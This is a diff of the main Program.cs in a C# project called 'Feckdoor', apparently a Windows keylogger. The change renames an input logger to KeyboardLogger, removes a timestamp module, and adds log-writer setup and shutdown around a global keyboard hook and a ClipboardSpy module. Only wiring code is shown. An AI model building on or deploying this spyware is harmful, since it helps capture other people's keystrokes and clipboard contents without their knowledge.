@@ -1,9 +1,6 @@
-﻿using System.Diagnostics;
-using System.Runtime.InteropServices;
-using System.Text;
+﻿using System.Text;
 using System.Text.Json;
 using System.Reflection;
-using System.Linq;
 using Microsoft.Win32;
 using Serilog;
 using System.Text.Json.Serialization;
@@ -13,11 +10,8 @@ namespace Feckdoor
 {
 	internal static class Program
 	{
-		private static string ClipboardTextCache = "";
-
-		private static InputLogger InputLog = null!;
+		private static KeyboardLogger InputLog = null!;
 		private static KillswitchHandler Killswitch = null!;
-		private static TimestampAppender TimestampAdd = null!;
 		private static ClipboardSpy ClipSpy = null!;
 
 		private static bool disposed = false;
@@ -27,7 +21,6 @@ namespace Feckdoor
 			WriteIndented = true,
 			Converters = { new JsonStringEnumConverter(JsonNamingPolicy.CamelCase) }
 		};
-
 
 		[STAThread]
 		static void Main(string[] args)
@@ -66,12 +59,12 @@ namespace Feckdoor
 				AppDomain.CurrentDomain.DomainUnload += OnShutdown;
 
 				// Initialize hooks
+				InputLogWriter.Initialize();
 				KeyboardHook.InstallHook();
 
 				// Initialize modules
-				InputLog = new InputLogger();
+				InputLog = new KeyboardLogger();
 				Killswitch = new KillswitchHandler();
-				TimestampAdd = new TimestampAppender();
 				ClipSpy = new ClipboardSpy();
 
 				Application.Run();
@@ -144,10 +137,10 @@ namespace Feckdoor
 				return;
 			try
 			{
+				InputLogWriter.Shutdown();
 				KeyboardHook.UninstallHook();
 				InputLog.Dispose();
 				Killswitch.Dispose();
-				TimestampAdd.Dispose();
 				ClipSpy.Dispose();
 				disposed = true;
 				Log.Information("Resource disposal fininshed. Bye!");
